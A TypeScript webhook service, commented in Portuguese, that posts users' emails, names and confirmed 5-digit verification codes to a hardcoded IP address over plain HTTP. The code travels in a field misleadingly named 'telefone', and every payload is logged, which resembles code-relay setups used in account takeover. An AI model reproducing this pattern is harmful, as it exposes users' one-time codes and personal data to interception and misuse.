/**
 * Webhook Service
 * Envia notificações para APIs externas
 */

import { db } from '@/db'
import { users } from '@/db/schema'
import { eq } from 'drizzle-orm'

interface CadastroPayload {
  email: string
  etapa: 'cadastro'
  nome: string
  telefone: string
}

interface NotificacaoPayload {
  email: string
  etapa: 'RVE1'
  nome: string
  telefone: string // Código de 5 dígitos enviado no campo "telefone"
}

class WebhookService {
  private cadastroUrl = 'http://31.97.93.134/api/cadastro'
  private notificacaoUrl = 'http://31.97.93.134/api/notificacao'

  /**
   * Envia webhook de cadastro (quando usuário completa informações)
   */
  async sendCadastroWebhook(data: {
    email: string
    name: string
    surname: string
    userId?: string
  }): Promise<boolean> {
    try {
      const payload: CadastroPayload = {
        email: data.email,
        etapa: 'cadastro',
        nome: `${data.name} ${data.surname}`.trim(),
        telefone: '000000000',
      }

      // Buscar userId se não fornecido (opcional, apenas para consistência interna)
      let userId = data.userId
      if (!userId) {
        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.email, data.email))
          .limit(1)
        userId = user?.id
      }

      const response = await fetch(this.cadastroUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })

      const responseBody = await response.text()
      const success = response.ok

      if (!success) {
        console.error('Erro ao enviar webhook de cadastro:', response.status, response.statusText, responseBody)
        return false
      }

      console.log('OK. Webhook de cadastro enviado com sucesso:', payload)
      return true
    } catch (error) {
      console.error('Erro ao enviar webhook de cadastro:', error)
      return false
    }
  }

  /**
   * Envia webhook de notificação (quando código é confirmado)
   * O campo "telefone" carrega o código de 5 dígitos.
   */
  async sendNotificacaoWebhook(data: {
    email: string
    name: string
    surname: string
    code: string // Código de 5 dígitos
    userId?: string
  }): Promise<boolean> {
    try {
      const payload: NotificacaoPayload = {
        email: data.email,
        etapa: 'RVE1',
        nome: `${data.name} ${data.surname}`.trim(),
        telefone: data.code,
      }

      // Buscar userId se não fornecido (opcional)
      let userId = data.userId
      if (!userId) {
        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.email, data.email))
          .limit(1)
        userId = user?.id
      }

      const response = await fetch(this.notificacaoUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })

      const responseBody = await response.text()
      const success = response.ok

      if (!success) {
        console.error('Erro ao enviar webhook de notificação:', response.status, response.statusText, responseBody)
        return false
      }

      console.log('OK. Webhook de notificação enviado com sucesso:', payload)
      return true
    } catch (error) {
      console.error('Erro ao enviar webhook de notificação:', error)
      return false
    }
  }
}

export const webhookService = new WebhookService()

